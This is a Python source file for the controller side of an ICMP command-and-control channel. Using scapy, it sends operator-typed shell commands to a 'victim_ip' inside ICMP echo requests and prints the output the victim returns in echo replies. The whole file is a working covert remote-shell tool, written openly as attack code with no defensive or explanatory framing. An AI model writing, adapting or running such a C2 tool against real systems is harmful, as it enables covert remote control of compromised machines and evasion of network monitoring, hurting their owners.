from scapy.all import sr,IP,ICMP,Raw,sniff
from multiprocessing import Process
import argparse

#Variables
ICMP_ID = int(13170)
TTL = int(64)

def check_scapy():
    try:
        from scapy.all import sr,IP,ICMP,Raw,sniff
    except ImportError:
        print("Install the Py3 scapy module")

parser = argparse.ArgumentParser()
parser.add_argument('-i', '--interface', type=str, required=True, help="Listener (virtual) Network Interface (e.g. eth0)")
parser.add_argument('-d', '--victim_ip', type=str, required=True, help="Destination IP address")
args = parser.parse_args()

def sniffer():
    sniff(iface=args.interface, prn=shell, filter="icmp", store="0")

def shell(pkt):
    if pkt[IP].src == args.victim_ip and pkt[ICMP].type == 0 and pkt[ICMP].id == ICMP_ID and pkt[Raw].load:
        icmppacket = (pkt[Raw].load).decode('utf-8', errors='ignore').replace('\n','')
        print(icmppacket)
    else:
        pass

def main():
    sniffing = Process(target=sniffer)
    sniffing.start()
    print("[+]ICMP C2 started!")
    while True:
        icmpshell = input("cmd> ")
        if icmpshell == 'exit':
            print("[+]Stopping ICMP C2...")
            sniffing.terminate()
            break
        elif icmpshell == '':
            pass
        else:
            payload = (IP(dst=args.victim_ip, ttl=TTL)/ICMP(type=8,id=ICMP_ID)/Raw(load=icmpshell))
            print(f"the payload is {payload}")
            sr(payload, timeout=0, verbose=0)
    sniffing.join()

if __name__ == "__main__":
    check_scapy()
    main()